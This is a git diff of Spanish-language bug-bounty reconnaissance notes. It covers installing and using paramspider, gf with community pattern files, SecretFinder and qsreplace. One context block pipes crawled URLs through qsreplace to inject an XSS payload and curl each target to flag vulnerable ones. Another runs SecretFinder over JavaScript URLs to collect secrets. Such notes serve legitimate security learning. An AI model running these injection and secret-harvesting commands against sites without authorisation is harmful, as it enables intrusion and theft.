@@ -109,13 +109,30 @@ sudo mv /home/kali/.local/bin/paramspider /usr/local/bin
 Forma de uso de la herramienta.
 Se crea una carpeta con todos los datos de saldia.
 
+### ACA!
+
 ```ruby
-paramspider -d hackerone.com
+paramspider -d hackerone.com --placeholder FUZZ
 ```
 
 ```ruby
 paramspider -d hackerone.com
 cat results/hackerone.com.txt | tee yy.json | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+```
+
+### Una vez encontrada algunos links procedemos a inyectar payloads con la herramienta gf
+
+## [gf](https://github.com/tomnomnom/gf)
+
+[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-penetration-testers-ethical-hackers/learn/lecture/35462246#overview)
+
+```ruby
+go install github.com/tomnomnom/gf@latest
+sudo mv ~/go/bin/gf /usr/local/bin
+mkdir ~/.gf
+cp ~/go/pkg/mod/github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5/examples/* ~/.gf
+git clone https://github.com/1ndianl33t/Gf-Patterns
+mv ~/Gf-Patterns/*.json ~/.gf
 ```
 
 # Buscador de Parametros
@@ -131,19 +148,6 @@ python3 SecretFinder.py
 
 ```ruby
 cat katana_js.txt | while read url; do python3 /opt/secretfinder/SecretFinder.py -i $url -o cli >> secret.txt; done
-```
-
-## [gf](https://github.com/tomnomnom/gf)
-
-[Link Udemy](https://www.udemy.com/course/recon-for-bug-bounty-penetration-testers-ethical-hackers/learn/lecture/35462246#overview)
-
-```ruby
-go install github.com/tomnomnom/gf@latest
-sudo mv ~/go/bin/gf /usr/local/bin
-mkdir ~/.gf
-cp ~/go/pkg/mod/github.com/tomnomnom/gf@v0.0.0-20200618134122-dcd4c361f9f5/examples/* ~/.gf
-git clone https://github.com/1ndianl33t/Gf-Patterns
-mv ~/Gf-Patterns/*.json ~/.gf
 ```
 
 ## [Qsreplace](https://github.com/tomnomnom/qsreplace)
